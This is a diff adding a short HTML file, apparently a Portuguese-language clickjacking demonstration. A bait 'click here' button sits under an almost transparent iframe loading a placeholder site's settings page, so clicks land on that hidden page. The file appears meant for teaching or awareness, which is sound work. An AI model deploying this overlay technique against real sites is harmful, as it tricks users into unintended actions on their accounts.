@@ -1,0 +1,16 @@
+<!-- clickjacking-monitorado.html -->
+<html>
+  <body>
+    <h1>Clique abaixo para ver uma surpresa:</h1>
+
+    <button onclick="alert('Clique registrado! Você clicou onde não devia 😈')" 
+            style="z-index: 1; position: absolute; top: 200px; left: 100px; font-size: 18px;">
+      Clique aqui 🎁
+    </button>
+
+    <iframe src="https://www.site.com/configuracoes"
+            style="position: absolute; top: 0; left: 0; width: 1000px; height: 700px; opacity: 0.01;
+                   z-index: 2; border: none;">
+    </iframe>
+  </body>
+</html>
